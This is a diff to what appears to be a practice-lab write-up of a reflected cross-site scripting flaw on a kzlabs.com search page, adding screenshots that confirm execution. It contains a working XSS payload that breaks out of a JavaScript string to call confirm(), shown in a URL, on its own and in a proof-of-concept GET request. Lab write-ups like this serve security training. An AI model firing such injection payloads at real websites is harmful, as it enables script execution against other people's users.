@@ -20,7 +20,16 @@ https://kzlabs.com/55.php?search=rajvardha%22%2Bconfirm%28%22RAJVARDHAN%22%29%2B
 ## Payload Used
 rajvardha"+confirm("RAJVARDHAN")+"
 
-##Proof of Concept Request
+# Proof of Concept
+## Screenshot 1 — Vulnerable application reflecting the injected payload
+
+![Payload Reflection](screenshots/lab55.1.png)
+
+## Screenshot 2 — Successful JavaScript execution confirming Reflected XSS
+
+![XSS Execution](screenshots/lab55.2.png)
+
+This confirms that arbitrary JavaScript can be executed through unsanitized user input.
 
 http
 GET /55.php?search=rajvardha"+confirm("RAJVARDHAN")+" HTTP/1.1
